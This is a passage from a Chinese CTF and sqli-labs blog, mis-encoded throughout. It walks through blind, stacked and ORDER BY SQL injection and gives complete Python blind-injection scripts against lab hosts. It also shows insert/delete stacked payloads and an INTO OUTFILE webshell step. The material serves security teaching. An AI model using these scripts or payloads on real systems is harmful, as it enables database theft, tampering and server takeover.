äºŒåˆ†æ³•æœ¬æ¥ç»™çš„æ˜¯[æå®¢å¤§æŒ‘æˆ˜2019]finalsqlçš„è„šæœ¬ï¼Œæˆ‘ç›´æ¥è´´å‡ºæ¥äº†ï¼š 123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://31bff700-e9d3-434e-8498-3eae23e162ac.node4.buuoj.cn:81/search.php&quot;params = &#123;&quot;id&quot;: &quot;&quot;&#125;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid) r = requests.get(url, params=params) time.sleep(0.05) if &quot;Cl&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) äºŒåˆ†æ³•è·‘è„šæœ¬çš„æ•ˆç‡æ˜¯è¿œé«˜äºå­—å…¸æ³•çš„ï¼Œå½“ç„¶è¿™é‡Œç”¨åˆ°çš„æ˜¯å †å æ³¨å…¥ã€‚asciiç 32åˆ°128æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬åˆ¤æ–­ä¹Ÿæ˜¯å–è¿™ä¸ªèŒƒå›´ã€‚é¦–å…ˆæˆ‘ä»¬æ‹¿ä¸­é—´å€¼ï¼ˆä¹Ÿå°±æ˜¯80ï¼‰å»è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå¤§äº80å°±æ‹¿å³åŠéƒ¨åˆ†çš„ä¸­é—´å€¼åˆ¤æ–­ï¼Œåä¹‹æ‹¿å·¦åŠéƒ¨åˆ†çš„ä¸­é—´å€¼åˆ¤æ–­ï¼Œç›´åˆ°åˆ¤æ–­æˆåŠŸåï¼Œå°†è¿™ä¸ªå€¼åŠ ä¸€åèµ‹å€¼ç»™flagå‚¨å­˜ã€‚è‡³äºä¸ºä»€ä¹ˆè¦åŠ ä¸€ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬åˆ¤æ–­è¯­å¥æ˜¯å¤§äºå·ï¼Œå› æ­¤å®é™…å€¼ä¼šä¸æµ‹è¯•å€¼ç›¸å·®ä¸€ä½ï¼Œæˆ‘ä»¬è¦è¡¥ä¸Šè¿™ä¸€ä½ã€‚ æ—¶é—´ç›²æ³¨æ—¶é—´ç›²æ³¨è„šæœ¬å’Œå¸ƒå°”ç›²æ³¨è„šæœ¬çš„åŒºåˆ«ä¸»è¦åœ¨äºåŸç†å’Œpayloadçš„æ„å»ºä¸Šã€‚è¿™é‡Œç›´æ¥è´´ä¸€éƒ¨åˆ†å‡ºæ¥ï¼š 123456789101112while low &lt; high: payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)&quot;%(i,mid) params = &#123;&#x27;id&#x27;:payload&#125; start_time = time.time() r = requests.get(url,params = params) end_time = time.time() if end_time - start_time &gt; 1: low = mid + 1 else: high = mid mid = (low + high) // 2 é¦–å…ˆåŸç†ä¾ç„¶æ˜¯äºŒåˆ†æ³•ã€‚åœ¨payloadæ„å»ºä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ifè¯­å¥ï¼Œè®©æŸ¥è¯¢è¯­å¥å¦‚æœä¸ºçœŸï¼Œå°±æ‰§è¡Œsleep(1)å‡½æ•°ï¼Œå†æ ¹æ®åŠ è½½æ—¶é—´æ˜¯å¦ä¸º1åˆ¤æ–­æŸ¥è¯¢è¯­å¥çœŸå‡ã€‚å…¶ä»–æ–¹é¢å’Œå¸ƒå°”ç›²æ³¨æ²¡æœ‰å¤ªå¤§åŒºåˆ«ã€‚ ä½œä¸šwp[æå®¢å¤§æŒ‘æˆ˜2019]finalsqlè¿™é¢˜ç”±äºè„šæœ¬å·²ç»ç»™äº†å°±æ²¡ä»€ä¹ˆå¥½å†™çš„ï¼Œä¸»è¦è¦æ³¨æ„è¿™é¢˜çš„æ³¨å…¥ç‚¹ä¸åœ¨POSTæ¡†ä¸­ï¼Œè€Œæ˜¯åœ¨ç‚¹å‡»æ•°å­—åé¡µé¢ä¸­ä»¥GETå½¢å¼æ³¨å…¥ï¼Œæ›´æ”¹idåçš„å€¼å³å¯ã€‚è„šæœ¬åœ¨ä¸Šæ–‡æœ‰ï¼Œçˆ†åº“çˆ†è¡¨å¯ä»¥è‡ªè¡Œä¿®æ”¹ï¼Œè¿™é¢˜ä¸»è¦æ˜¯è¿‡æ»¤äº†ç©ºæ ¼å’Œå…¶ä»–æŸ¥è¯¢æ–¹å¼çš„ç›¸å…³å…³é”®å­—ã€‚ è¿˜æœ‰è¦åæ§½ä¸€ç‚¹ï¼Œè¿™ä¸ªè¡¨é‡Œé¢çš„æ•°æ®åˆè‡­åˆé•¿ï¼Œflagè—åœ¨æœ€åï¼Œç»äº†ã€‚ [RoarCTF 2019]Online Proxyè¿™é¢˜ä¹Ÿæ˜¯ç›¸å½“æ¶å¿ƒäººäº†ã€‚å¦‚æœæ²¡æœ‰å»æŸ¥çœ‹æºç çš„è¯å¯èƒ½å°±ä¼šGETä¸€ä¸ªurlè¿›å»ç„¶åå’Œè¿™ä¸ªurlæ–—æ™ºæ–—å‹‡ã€‚ä½†æ˜¯æŸ¥çœ‹æºç åæˆ‘ä»¬å‘ç°è¿™ä¹ˆä¸€æ®µï¼š 1Debug Info: Duration: 0.095027923583984 s Current Ip: 222.76.115.182 çœ‹åˆ°è¿™ä¸ªcurrent ipé©¬ä¸Šå°±èƒ½æƒ³åˆ°xffï¼Œæˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªxffè¯•è¯•ï¼š æˆ‘ä»¬å‘ç°current ipå·²ç»æ›´æ”¹äº†ï¼Œè€Œç”±äºæˆ‘ä¸Šä¸ªæµ‹è¯•çš„æ˜¯111ï¼Œå› æ­¤last ipå°±æ˜¯111ï¼Œå¦‚æœæˆ‘ä»¬å†æ³¨å…¥ä¸€æ¬¡111ï¼Œé‚£ä¹ˆcurrent ipå°±ä¼šå˜æˆ111è€Œlast ipä¼šå˜æˆ1â€™orâ€™1ã€‚ä½†æ˜¯å½“æˆ‘ä»¬åœ¨è¿™ç§æƒ…å†µä¸‹å†æ³¨å…¥ä¸€æ¬¡111ï¼Œæˆ‘ä»¬ä¼šå‘ç°æœ‰æ„æ€çš„äº‹å‡ºç°äº†ï¼š æˆ‘ä»¬å‘ç°last ipå˜æˆäº†1ï¼Œè¿™è¯´æ˜1â€™orâ€™1è¯­å¥è¢«æ‰§è¡Œäº†ã€‚è¿™æ˜¯ç”±äºå½“ä¸¤æ¬¡ä¸Šä¼ çš„å†…å®¹ç›¸åŒæ—¶ï¼Œcurrent ipä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› æ­¤æ•°æ®åº“å°±ä¼šæ‰¾åˆ°last ipå¹¶æ‰§è¡Œã€‚é‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œå°±æ˜¯æ³¨å…¥ç‚¹äº†ï¼Œæ‰€ä»¥è¿™å’Œproxyä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ï¼ˆï¼Œåªèƒ½è¯´ä½ è¿™æ³¨å…¥ç‚¹æŒºèƒ½è—å•Šã€‚ è¿™é¢˜è¦ç”¨åˆ°çš„æ˜¯ç›²æ³¨ï¼Œæˆ‘ä»¬ä½¿ç”¨å¸ƒå°”ç›²æ³¨ï¼Œè€Œä¸”é¢˜ç›®æç¤ºæˆ‘ä»¬flagåœ¨uuidé‡Œï¼Œå› æ­¤cookieé‡Œçš„uuidè¿™æ®µä¾¿æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚ç»¼åˆä»¥ä¸Šï¼Œæˆ‘ä»¬å¼€å§‹å†™è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &quot;http://node4.buuoj.cn:28368/&quot;head = &#123; &quot;Cookie&quot;: &quot;track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2&quot;, &quot;X-Forwarded-For&quot;: &quot;&quot;&#125;flag = &quot;&quot;for i in range(1, 150): time.sleep(0.06) low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while low &lt; high: head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid) r = requests.post(url, headers=head) head[&quot;X-Forwarded-For&quot;] = &quot;111&quot; r = requests.post(url, headers=head) r = requests.post(url, headers=head) time.sleep(0.05) if &quot;Last Ip: 1&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) è·‘å‡ºæ¥åº“åï¼š çŒœæµ‹flagåœ¨F4l9_D4t4B45eåº“ä¸­ï¼Œæ¥ä¸‹æ¥æ„å»ºæŸ¥è¡¨ã€æŸ¥åˆ—ã€æŸ¥æ•°æ®çš„payloadï¼š 1234567891011#æŸ¥è¡¨&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid)#ç»“æœï¼šF4l9_t4b1e#æŸ¥åˆ—&quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)#ç»“æœï¼šF4l9_C01uMn#æŸ¥æ•°æ®&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)#ç»“æœï¼šflag&#123;G1zj1n_W4nt5_4_91r1_Fr1end&#125;,flag&#123;20c02151-818b-4e3e-b853-322da92a0bed&#125; æ€»ä¹‹ç›²æ³¨é¢˜çš„éš¾ç‚¹è¿˜æ˜¯åœ¨æ‰¾åˆ°æ³¨å…¥ç‚¹è¿™ä¸€æ­¥ä¸Šã€‚ [GYCTF2020]Ezsqliè¿™é¢˜å…¶å®ä¸Šæ¬¡æ— åˆ—åæ—¶å·²ç»å†™äº†ä¸€éï¼Œä½†æ˜¯å½“æ—¶çš„è„šæœ¬æ˜¯æ‰’çš„ï¼Œè¿™æ¬¡å°±è‡ªå·±å†™ä¸€ä¸ªï¼Œå…·ä½“åŸç†å¯ä»¥å‚è€ƒæˆ‘ä¸Šæ¬¡é‚£ç¯‡æ— åˆ—åæ³¨å…¥çš„åšå®¢ã€‚ 123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&quot;payload = &#123;&quot;id&quot;: &quot;&quot;&#125;flag = &quot;&quot;for i in range(1, 150): time.sleep(0.06) low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while low &lt; high: payload[&quot;id&quot;] = &quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i, mid) r = requests.post(url, data=payload) time.sleep(0.05) if &#x27;Nu1L&#x27; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt; 1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) è·‘å‡ºæ¥è¡¨åä¸ºâ€œusers233333333333333,f1ag_1s_h3r3_hhhhhâ€ï¼Œæ¥ä¸‹æ¥ç›´æ¥çˆ†æ•°æ®å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930import requestsimport timeurl = &#x27;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&#x27;payload = &#123;&quot;id&quot;: &quot;&quot;&#125;flag = &#x27;&#x27;num = 0def add(result): res = &#x27;&#x27; res += result return resfor i in range (1,60): if (num == 1): break for j in range (32,127): time.sleep(0.06) s = add(flag + chr(j)) payload[&quot;id&quot;] = &#x27;1^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1&#x27;.format(s) r = requests.post(url, data=payload) if &#x27;Nu1L&#x27; in r.text: flag += chr(j-1) print(flag) break if &#x27;&#125;&#x27; in r.text: num = 1 break è¿™é‡Œæ²¡æœ‰ç”¨äºŒåˆ†æ³•ï¼Œè°ƒè¯•çš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜ï¼Œå…ˆç”¨çˆ†ç ´ä»£æ›¿ä¸‹ï¼Œç­‰ä¹‹åå†æ”¹è¿‡æ¥ã€‚è¿™é‡Œçš„æ•°æ®å‡ºæ¥éƒ½æ˜¯å¤§å†™å­—æ¯ï¼Œflagè¦æ˜¯å°å†™å­—æ¯ï¼Œæœ€åè®°å¾—æ”¹è¿‡æ¥å°±è¡Œäº†ã€‚ æ€»ç»“ç›²æ³¨çš„ä¸»è¦è€ƒç‚¹å°±é‚£ä¸‰ä¸ªï¼šæ³¨å…¥ç‚¹å¯»æ‰¾ã€payloadæ„å»ºå’Œè„šæœ¬ç¼–å†™ï¼ŒåŸºæœ¬ä¸å¹³å¸¸çš„sqlæ³¨å…¥é¢˜æ— å¼‚ï¼Œä¸»è¦æ˜¯è„šæœ¬è¦å¤šå†™ï¼Œå–„äºæ‰¾åˆ°é—®é¢˜ï¼Œå¤šç”¨å‡ ç§æ–¹å¼ç¼–å†™è„šæœ¬ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql -python","slug":"web-mysql-python","permalink":"http://example.com/tags/web-mysql-python/"}]},{"title":"sqli-labsç»ƒä¹ -less38-53","slug":"sqli-labsç»ƒä¹ -less38-53","date":"2021-11-15T12:29:05.000Z","updated":"2021-11-19T14:52:32.356Z","comments":true,"path":"2021/11/15/sqli-labsç»ƒä¹ -less38-53/","link":"","permalink":"http://example.com/2021/11/15/sqli-labs%E7%BB%83%E4%B9%A0-less38-53/","excerpt":"å‰è¨€ç»è¿‡å‡ ä¸ªæœˆçš„ä¸æ‡ˆå¥‹æˆ˜ï¼ˆï¼Œç»ˆäºæŠŠé¶åœºå‰ä¸‰é¡µå…¨éƒ¨åˆ·å®Œäº†ï¼Œç¬¬å››é¡µéƒ½æ˜¯æŒ‘æˆ˜é¢˜ï¼Œæ£€éªŒè¿™ä¸ªé¶åœºçš„å­¦ä¹ æˆæœã€‚æœ€åä¹Ÿä¼šæ€»ç»“sqlæ³¨å…¥çš„è¿‡ç¨‹åŠæ–¹æ³•ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"å‰è¨€ç»è¿‡å‡ ä¸ªæœˆçš„ä¸æ‡ˆå¥‹æˆ˜ï¼ˆï¼Œç»ˆäºæŠŠé¶åœºå‰ä¸‰é¡µå…¨éƒ¨åˆ·å®Œäº†ï¼Œç¬¬å››é¡µéƒ½æ˜¯æŒ‘æˆ˜é¢˜ï¼Œæ£€éªŒè¿™ä¸ªé¶åœºçš„å­¦ä¹ æˆæœã€‚æœ€åä¹Ÿä¼šæ€»ç»“sqlæ³¨å…¥çš„è¿‡ç¨‹åŠæ–¹æ³•ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ less38-45å…³äºå †å æ³¨å…¥sqlæ³¨å…¥çš„åˆä¸€å—æ‹¼å›¾è¡¥ä¸Šäº†ï¼Œè¿™å—æ‹¼å›¾å°±æ˜¯å †å æ³¨å…¥ã€‚é¦–å…ˆæˆ‘ä»¬æˆªå–å…³é”®æºç çœ‹ä¸€ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql))&#123; /* store first result set */ if ($result = mysqli_store_result($con1)) &#123; if($row = mysqli_fetch_row($result)) &#123; echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;; printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125;// mysqli_free_result($result); &#125; /* print divider */ if (mysqli_more_results($con1)) &#123; //printf(&quot;-----------------\\n&quot;); &#125; //while (mysqli_next_result($con1));&#125;else &#123; echo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; &#125; æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œæºç ä½¿ç”¨äº†ä¸€ä¸ªå«åšmysqli_multi_query()çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸€æ¬¡å¯ä»¥æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œè¿™å°±ä¸ºå †å æ³¨å…¥åˆ›é€ äº†æ¡ä»¶ã€‚ è€Œæ‰€è°“å †å æ³¨å…¥ï¼Œå°±æ˜¯å†™å…¥å¤šæ¡payloadï¼Œä¹‹é—´ç”¨åˆ†å·åˆ†éš”å¼€ã€‚ä¸è¿‡åœ¨å®æˆ˜ä¸­å †å æ³¨å…¥å‡ºç°çš„å¯èƒ½æ€§è¾ƒå°ï¼Œå› ä¸ºä½¿ç”¨æ¡ä»¶è¿˜æ˜¯ååˆ†è‹›åˆ»çš„ã€‚è€Œä¸”å †å æ³¨å…¥äº§ç”Ÿçš„å±å®³æ˜¯ååˆ†ä¹‹å¤§çš„ï¼Œä¼šå¯¼è‡´å¢åˆ æŸ¥æ”¹è¯­å¥éƒ½å¯ä»¥å®ç°ï¼Œå¯¹æ•°æ®åº“å®‰å…¨é€ æˆé‡å¤§éšæ‚£ã€‚ æˆ‘ä»¬å°±æ‹¿ç¬¬38å…³æ¥è¿›è¡Œæµ‹è¯•ï¼Œæ„å»ºpayloadï¼š 1?id=1&#x27;;insert into users(id,username,password)values(99,&#x27;mrl64&#x27;,&#x27;yeah&#x27;) --+ æˆ‘ä»¬å‘ç°æˆ‘ä»¬æˆåŠŸå†™å…¥äº†ä¸€æ®µæ•°æ®ï¼ŒåŒç†æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªæ•°æ®åˆ å»ï¼š 1?id=1&#x27;;delete from users where id=99 --+ å¢åˆ æŸ¥æ”¹çš„æ‰€æœ‰è¯­å¥åªè¦æ²¡æœ‰è¢«è¿‡æ»¤éƒ½æ˜¯è¿˜å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Œè¿™é‡Œä¸åšå…·ä½“æ¼”ç¤ºäº†ã€‚ less38-41å…¶å®sqli-labså¹¶æ²¡è¯´æœ‰ä»€ä¹ˆè§£é™¤çš„ç›®æ ‡ï¼Œåªæ˜¯ä¸€ä¸ªè¯•ç‚¼åœºã€‚å¦‚æœä¸€å®šè¦åƒä¹‹å‰çš„å…³å¡ä¸€æ ·çˆ†å‡ºæ•°æ®å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥è”åˆæ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ç­‰ç­‰éƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡è¿™é‡Œå°±å‡ºç°äº†ä¸€ç§æ–°çš„æ³¨å…¥æ–¹å¼ï¼Œå‚è€ƒpayloadï¼š 1?id=-1&#x27; union select 1,2,database(); è¿™æ˜¯ç”±äºmysqli_multi_query()å‡½æ•°çš„ä½œç”¨ï¼Œè¯†åˆ«åˆ°äº†æˆ‘ä»¬æ„å»ºçš„è¿™å¥payloadï¼Œå› æ­¤è¢«æˆåŠŸæ‰§è¡Œï¼Œè€Œåé¢çš„è¯­å¥ä¹Ÿä¸ä¼šå› ä¸ºè¯­æ³•é”™è¯¯è€Œçˆ†é”™ã€‚ less38æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œ39å…³æ˜¯æ•´æ•°å‹æ³¨å…¥ï¼Œ40å…³æ˜¯å•å¼•å·å­—ç¬¦å‹ç›²æ³¨ï¼Œ41å…³æ˜¯æ•´æ•°å‹ç›²æ³¨ã€‚ less42-45è¿™å‡ å…³éƒ½æ˜¯POSTçš„é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç ä¼šå‘ç°usernameè¿›è¡Œäº†è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬è¦åœ¨passwordä¸­è¿›è¡Œæ³¨å…¥ï¼Œå…·ä½“æ–¹æ³•å’Œå‰é¢å‡ å…³æ˜¯ä¸€æ ·çš„ã€‚ less42æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œless43æ˜¯å•å¼•å·æ‹¬å·æ³¨å…¥ï¼Œ44å…³æ˜¯å•å¼•å·ç›²æ³¨ï¼Œ45å…³æ˜¯å•å¼•å·æ‹¬å·ç›²æ³¨ã€‚ less46-53order byæ’åºè¿™æ¬¡æºç ä¸­çš„æŸ¥è¯¢è¯­å¥å˜æˆäº†order byï¼š 1$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; ä¹Ÿè®¸ä¼šæœ‰äººæ„Ÿåˆ°ç–‘æƒ‘ï¼Œorder byä¸æ˜¯ç”¨æ¥æŸ¥åˆ—æ•°çš„å—ï¼Œæ€ä¹ˆè¿˜èƒ½ç”¨æ¥æŸ¥è¯¢æ•°æ®å‘¢ï¼Ÿä½†å…¶å®order byå…³é”®å­—çš„çœŸæ­£ä½œç”¨å…¶å®æ˜¯å¯¹ç»“æœé›†æŒ‰ç…§ä¸€ä¸ªåˆ—æˆ–è€…å¤šä¸ªåˆ—è¿›è¡Œæ’åºï¼Œé»˜è®¤ä¸ºå‡åº(ASC)ï¼Œå¯ä»¥é€šè¿‡å…³é”®å­—æ”¹å˜æ’åºæ–¹å¼ã€‚å®Œæ•´çš„è¯­æ³•å¦‚ä¸‹ï¼š 1SELECT column_name,column_name FROM table_name ORDER BY column_name,column_name ASC|DESC; æˆ‘ä»¬æ¥è·‘å‡ æ¡è¯­å¥è¯•ä¸€è¯•ï¼š æŒ‰idé€†åºæ’åºï¼š?sort=id desc æŒ‰usernameé¡ºåºæ’åºï¼š?sort=username [asc] è¿™å°±æ˜¯order byçš„æŸ¥è¯¢åŸç†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°order byåé¢ä¸èƒ½è·Ÿè”åˆæŸ¥è¯¢è¯­å¥ï¼Œè¿™å°±å¯¼è‡´äº†ä¹‹å‰å¾ˆå¤šæ³¨å…¥æ–¹æ³•æ— æ³•ä½¿ç”¨ã€‚ä½†æ˜¯æˆ‘ä»¬çŸ¥é“order byåé¢å¯ä»¥è·Ÿä¸€ä¸ªæ•°å­—ï¼Œè¿™é¦–å…ˆä¸ºæˆ‘ä»¬åšå¯èƒ½æœ‰çš„é—­åˆåˆ›é€ äº†æ¡ä»¶ã€‚ less46-49ç»è¿‡æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¾—çŸ¥äº†order byåå¯ä»¥ä½¿ç”¨limitã€into outfileç­‰è¯­å¥ï¼Œå› æ­¤è¿™é‡Œå°±æœ‰ä¸¤ç§æ˜æ˜¾çš„æ€è·¯ï¼šæŠ¥é”™æ³¨å…¥ä¸webshellã€‚ å‡ä»¥46å…³ä¸ºä¾‹ï¼Œé¦–å…ˆæ˜¯æŠ¥é”™æ³¨å…¥ï¼Œæ„å»ºpayloadï¼š 1234?sort=1 and extractvalue(1,concat(0x7e,database(),0x7e))Welcome DhakkanXPATH syntax error: &#x27;~security~&#x27; ä¹‹å‰æåˆ°çš„æŠ¥é”™æ³¨å…¥æ–¹å¼å…¨éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ ç¬¬äºŒç§æ–¹æ³•æ˜¯é€šè¿‡into outfileå†™å…¥ä¸€å¥è¯æœ¨é©¬å¹¶ä½¿ç”¨webshellè¿›è¡Œè¿æ¥ï¼Œæ„å»ºpayloadï¼š 1?sort=1 into outfile &#x27;/var/www/html/sqli-labs-php7/1.php&#x27; ç„¶åé€šè¿‡èœåˆ€æˆ–è€…èšå‰‘ç­‰webshellå·¥å…·è¿›è¡Œè¿æ¥ï¼Œå’Œless7åŸºæœ¬ä¸€æ ·ï¼Œè®°ä½è¦æ³¨æ„æƒé™é—®é¢˜ã€‚ å½“ç„¶ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ less46æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œ47å…³æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œ48å…³æ˜¯æ•°å­—å‹ç›²æ³¨ï¼Œ49å…³æ˜¯å•å¼•å·å­—ç¬¦å‹ç›²æ³¨ã€‚ less50-53æœ€åå››å…³äº†ï¼Œé¦–å…ˆè¿™å‡ å…³æœ¬è´¨ä¸Šä¸46-49å…³å‡ ä¹æ²¡å·®åˆ«ï¼Œæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ä½¿ç”¨äº†mysqli_multi_query()å‡½æ•°ï¼Œå› æ­¤å­˜åœ¨å †å æ³¨å…¥ï¼Œè§£é¢˜æ–¹æ³•ä¹Ÿå¯ä»¥é€šç”¨less46-49çš„æ–¹æ³•ã€‚ less50æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œ51å…³æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥ï¼Œ52å…³æ˜¯æ•°å­—å‹ç›²æ³¨ï¼Œ53å…³æ˜¯å•å¼•å·å­—ç¬¦å‹ç›²æ³¨ã€‚ æ€»ç»“åˆ°æ­¤ä¸ºæ­¢sqli-labsçš„å‰3é¡µå·²ç»å…¨éƒ¨ç»“æŸäº†ï¼Œç¬¬4é¡µä¸»è¦éƒ½æ˜¯é¢˜ç›®ï¼Œç”¨æ¥è®­ç»ƒsqlæ³¨å…¥ï¼Œæ²¡æœ‰æ–°çš„å†…å®¹äº†ã€‚è¿™é‡Œæ€»ç»“sqlæ³¨å…¥çš„è¿‡ç¨‹åŠæ–¹æ³•ï¼š åˆ¤æ–­æ³¨å…¥ç±»å‹ä¸è¿‡æ»¤ï¼šé¦–å…ˆæ‰¾åˆ°èƒ½å¤Ÿå®æ–½æ³¨å…¥çš„åœ°æ–¹è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•ï¼Œä½¿ç”¨and 1=1ã€rand(true)ç­‰æ–¹å¼åˆ¤æ–­æ³¨å…¥ç±»å‹æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ã€‚åœ¨è¿™æ­¥æ—¶å¯ä»¥åˆæ­¥ç¡®å®šç©ºæ ¼ã€æ³¨é‡Šç¬¦ã€å¼•å·ã€orç­‰æ˜¯å¦è¢«è¿‡æ»¤ã€‚ åˆ¤æ–­æ³¨å…¥æ–¹æ³•ï¼šæ¥ç€å°è¯•æ„å»ºä¸åŒçš„payloadï¼Œä¾‹å¦‚è”åˆæ³¨å…¥çš„payloadã€æŠ¥é”™æ³¨å…¥çš„payloadæ¥åˆ¤æ–­åº”å½“é€‰æ‹©çš„æ³¨å…¥æ–¹å¼ã€‚ä¾‹å¦‚æ²¡æœ‰æŠ¥é”™å›æ˜¾æ’é™¤æŠ¥é”™æ³¨å…¥ï¼Œæ²¡æœ‰æ³¨å…¥ä¸åŒå¯¼è‡´å›æ˜¾ä¸åŒæ’é™¤å¸ƒå°”ç›²æ³¨ç­‰ï¼Œåˆ—åæ— æ³•æŸ¥è¯¢ä½¿ç”¨æ— åˆ—åæ³¨å…¥ç­‰ç­‰ã€‚ æ„å»ºpayloadæˆ–ç¼–å†™è„šæœ¬ï¼šæ ¹æ®è¿‡æ»¤æƒ…å†µã€æ³¨å…¥æ–¹å¼æ¥æ„å»ºpayloadå®ç°sqlæ³¨å…¥ï¼Œå¦‚æœæ¶‰åŠç›²æ³¨çš„è¿˜éœ€è¦ç¼–å†™ç›²æ³¨è„šæœ¬ï¼Œæœ€åæˆåŠŸè·å–æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚ å½“ç„¶åœ¨å®æˆ˜ä¸­sqlæ³¨å…¥çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“å¤§çš„ï¼Œéœ€è¦å¤§é‡çš„å®æˆ˜ç»éªŒæ¥è¿›è¡Œç§¯ç´¯ã€‚æ¥ä¸‹æ¥è¿˜æœ‰å¾ˆå¤šæ–°ä¸œè¥¿åœ¨å‰é¢ï¼Œè®©æˆ‘ä»¬è¿›å…¥ä¸‹ä¸ªé¶åœºç»§ç»­ç£¨ç‚¼ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"ã€æå®¢å¤§æŒ‘æˆ˜2021ã€‘write up","slug":"ã€æå®¢å¤§æŒ‘æˆ˜2021ã€‘write up","date":"2021-11-15T09:35:28.000Z","updated":"2021-12-06T11:17:18.278Z","comments":true,"path":"2021/11/15/ã€æå®¢å¤§æŒ‘æˆ˜2021ã€‘write 